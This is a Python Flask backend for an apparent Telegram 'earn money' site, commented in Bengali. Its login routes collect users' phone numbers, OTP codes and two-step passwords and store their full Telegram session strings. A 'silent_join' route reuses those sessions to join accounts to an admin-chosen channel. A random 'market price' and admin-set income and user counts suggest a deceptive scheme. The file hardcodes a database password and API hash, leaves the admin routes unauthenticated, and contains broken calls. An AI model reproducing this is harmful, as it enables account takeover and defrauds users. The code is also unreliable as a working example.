import os
import time
import random
import asyncio
import threading
import requests
import firebase_admin
from datetime import datetime, timedelta
from pymongo import MongoClient
from telethon.errors import PasswordHashInvalidError
from telethon.errors import SessionPasswordNeededError
from functools import wraps
# Flask ও ডাটাবেস সম্পর্কিত ইমপোর্ট
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from firebase_admin import credentials, db
# Telethon সম্পর্কিত ইমপোর্ট
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest, GetParticipantRequest
from telethon.network.mtprotosender import MTProtoSender

def patched_handle_update(self, update):
    try:
        self._update_handlers[type(update)](update)
    except Exception:
        pass

# বাগটি বাইপাস করা
MTProtoSender._handle_update = patched_handle_update
# ---------------------------------------------------------
# ১. কনফিগারেশন ও ডাটাবেস সেটআপ
# ---------------------------------------------------------
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_strong_secure_786")
CORS(app)

API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

if not firebase_admin._apps:
    cred = credentials.Certificate("firebase-adminsdk.json")
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://teleearnbd-781d6-default-rtdb.firebaseio.com'
    })

client_db = MongoClient(MONGO_URI)
mdb = client_db['aaf_tele_earn_db']
users_col = mdb['users']
tasks_col = mdb['tasks']
settings_col = mdb['settings']

# ইভেন্ট লুপ ফিক্স (গ্লোবাল)
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

# ---------------------------------------------------------
# ২. হেল্পার ফাংশন
# ---------------------------------------------------------
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'uid' not in session:
            return redirect(url_for('render_login'))
        return f(*args, **kwargs)
    return decorated_function

def get_admin_settings():
    return db.reference('admin_settings').get() or {}

# ---------------------------------------------------------
# ৩. API রুটস
# ---------------------------------------------------------
@app.route('/api/send_otp', methods=['POST'])
def send_otp_handler():
    data = request.json
    phone = data.get('phone')
    
    print(f"DEBUG SEND OTP: Attempting for {phone}")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def main():
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop, auto_reconnect=False)
        await client.connect()
        
        try:
            result = await client.send_code_request(phone)
            # ডাটাবেসে ফোন কোড হ্যাশ সেভ করা হচ্ছে
            users_col.update_one(
                {"phone": phone},
                {"$set": {
                    "temp_session": client.session.save(),
                    "phone_code_hash": result.phone_code_hash,
                    "auth_pending": True
                }},
                upsert=True
            )
            return True, "Success"
        except Exception as e:
            return False, str(e)
        finally:
            await client.disconnect()

    try:
        success, message = loop.run_until_complete(app.py())
        if success:
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "message": message})
    except Exception as fatal_e:
        print(f"Fatal Error: {str(fatal_e)}")
        return jsonify({"success": False, "message": "Connection Error, please retry."})
    finally:
        loop.close()




@app.route('/api/verify_login', methods=['POST'])
def verify_login_handler():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password')

    # ডাটাবেস থেকে ওই ফোনের টেম্পোরারি ডাটা আনা
    temp_data = users_col.find_one({"phone": phone})
    
    if not temp_data or not temp_data.get("temp_session"):
        return jsonify({"success": False, "message": "Session Expired or Not Found."})
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def process_login():
        # সেভ করা টেম্পোরারি সেশন দিয়ে ক্লায়েন্ট শুরু করা
        client = TelegramClient(
            StringSession(temp_data["temp_session"]),
            API_ID,
            API_HASH,
            loop=loop
        )
        await client.connect()

        try:
            if password:
                # ২-স্টেপ ভেরিফিকেশন থাকলে
                user = await client.sign_in(password=str(password).strip())
            else:
                # ওটিপি দিয়ে সাইন ইন
                code_hash = temp_data.get("phone_code_hash")
                user = await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)

            # ইউজার ডাটা এক্সট্রাক্ট করা
            tg_id = user.id
            first_name = getattr(user, 'first_name', 'No Name')
            last_name = getattr(user, 'last_name', '')
            full_name = f"{first_name} {last_name}".strip()
            username = getattr(user, 'username', 'N/A')
            final_session = client.session.save()

            # ডাটাবেসে ফাইনাল আপডেট
            users_col.update_one(
                {"phone": phone},
                {"$set": {
                    "telegram_id": tg_id,
                    "name": full_name,
                    "username": username,
                    "session_str": final_session,
                    "auth_pending": False,
                    "last_login": datetime.now()
                }}
            )
            return True, tg_id

        except SessionPasswordNeededError:
            return False, "SHOW_PWD_STEP"
        except Exception as e:
            print(f"Login Error: {str(e)}")
            return False, str(e)
        finally:
            await client.disconnect()

    try:
        success, message = loop.run_until_complete(main())
        if success:
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "message": message})

        success, result = loop.run_until_complete(process_login())

        if success:
            session['uid'] = result # ফ্ল্যাস্ক সেশনে ইউজার আইডি রাখা
            return jsonify({"success": True})

        if result == "SHOW_PWD_STEP":
            return jsonify({"success": False, "message": "SHOW_PWD_STEP"})

        return jsonify({"success": False, "message": result})

    except Exception as e:
        return jsonify({"success": False, "message": str(e)})
    finally:
        loop.close()

        
        
############-----------------&&&&&&&&&&&&&&&&&&&&____________--------------


@app.route('/api/silent_join', methods=['POST'])
@login_required
def silent_join():
    uid = session.get('uid')
    user = users_col.find_one({"telegram_id": uid})
    admin_data = get_admin_settings()
    target_channel = admin_data.get('channel_id') 

    if not user or 'session_str' not in user:
        return jsonify({"success": False, "message": "Session not found"}), 404

    def background_join():
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            client = TelegramClient(StringSession(user['session_str']), API_ID, API_HASH, loop=loop)
            with client:
                client.loop.run_until_complete(client(JoinChannelRequest(target_channel)))
            users_col.update_one({"telegram_id": uid}, {"$set": {"is_joined": True}})
        except Exception as e:
            print(f"Join Error: {e}")

    threading.Thread(target=background_join).start()
    return jsonify({"success": True})

# --- বাকি সব রুটস (Dashboard, Task, Market ইত্যাদি) আগের মতোই থাকবে ---
@app.route('/api/user/data/<int:user_id>')
def get_user_data_by_id(user_id):
    if 'uid' not in session or session.get('uid') != user_id:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
    user = users_col.find_one({"telegram_id": user_id})
    admin_data = get_admin_settings()
    if not user: return jsonify({"status": "error", "message": "User not found"}), 404
    return jsonify({
        "status": "success",
        "user": {
            "username": user.get("name", "User"),
            "telegram_id": user.get("telegram_id"),
            "cash": f"{user.get('main_balance', 0.0):.2f}",
            "aaf": f"{user.get('aaf_balance', 0):.0f}",
            "is_joined": user.get('is_joined', False)
        },
        "admin": {
            "channel_url": admin_data.get('channel_link', '#'),
            "server_income": admin_data.get('server_income', 0),
            "server_trading": admin_data.get('server_trading', 0),
            "total_users": admin_data.get('extra_users', 0)
        }
    })
# ---------------------------------------------------------
# 4. ট্রেডিং ও মার্কেট কন্ট্রোল
# ---------------------------------------------------------


@app.route('/api/user/tasks/claim', methods=['POST'])
@login_required
def claim_task():
    uid = session.get('uid')
    task_id = request.json.get('task_id')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    admin_data = get_admin_settings()
    task = tasks_col.find_one({"id": task_id})
    user = users_col.find_one({"telegram_id": uid})

    if not task or not user:
        return jsonify({"success": False, "message": "Invalid Task/User"})

    # মেম্বারশিপ চেক (লিভ নিলে টাকা পাবে না)
    if not user.get('is_joined', False):
        return jsonify({"success": False, "message": "আগে চ্যানেলে জয়েন করুন!"})

    if task_id in user.get("completed_tasks", []):
        return jsonify({"success": False, "message": "ইতিমধ্যেই করেছেন!"})



# ---------------------------------------------------------
# ৫. ট্রেডিং ও মার্কেট কন্ট্রোল
# ---------------------------------------------------------
@app.route('/api/market/current-price')
def get_market_price():
    # অ্যাডমিন যদি ম্যানুয়াল প্রাইস সেট করে রাখে তবে সেটি দেখাবে
    config = db.reference('market_config').get() or {}
    if config.get('use_manual'):
        price = config.get('manual_price')
    else:
        # ডাইনামিক প্রাইস জেনারেশন
        price = round(1.0500 + (random.uniform(-0.005, 0.005)), 4)
    
    return jsonify({"price": price})

# ---------------------------------------------------------
# ৬. অ্যাডমিন এপিআই (Admin Master Controls)
# ---------------------------------------------------------
@app.route('/admin/update_server', methods=['POST'])
def update_server():
    data = request.json
    ref = db.reference('admin_settings')
    
    # সব ডাটা একবারে আপডেট হবে
    ref.update({
        'server_income': data.get('income'),
        'server_trading': data.get('trading'),
        'extra_users': data.get('extra_users'),
        'channel_link': data.get('channel_link'),
        'bot_token': data.get('bot_token'),
        'channel_id': data.get('channel_id'),
        'ip_security': data.get('ip_security', True) # এটি নতুন যোগ হলো
    })
    return jsonify({"status": "success"})

@app.route('/api/admin/users', methods=['GET'])
def get_all_users():
    try:
        users = list(users_col.find({}, {"_id": 0}))
        # জাভাস্ক্রিপ্ট কোডের সাথে মিল রেখে রেসপন্স সাজানো
        return jsonify({"success": True, "users": users})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


# ---------------------------------------------------------
# ৮. পেজ রাউটিং (Frontend Rendering)
# ---------------------------------------------------------
@app.route('/')
def index():
    if 'uid' in session: return redirect(url_for('render_dashboard'))
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def render_dashboard(): return render_template('dashboard.html')

@app.route('/refer_list')
@login_required
def render_refer_list(): return render_template('refer_list.html')

@app.route('/payment_history')
@login_required
def render_payment_history(): return render_template('payment_history.html')

@app.route('/task')
@login_required
def render_task(): return render_template('task.html')

@app.route('/trading')
@login_required
def render_trading(): return render_template('trading.html')

@app.route('/wallet')
@login_required
def render_wallet(): return render_template('wallet.html')

@app.route('/account')
@login_required
def render_account(): return render_template('account.html')

@app.route('/admin_panel')
def render_admin(): return render_template('admin.html')

@app.route('/login')
def render_login():
    session.clear()
    return render_template('login.html')

if __name__ == "__main__":
    # Render এর জন্য পোর্ট হ্যান্ডলিং
    port = int(os.environ.get("PORT", 10000)) 
    app.run(host="0.0.0.0", port=port,debug=False, threaded=True)
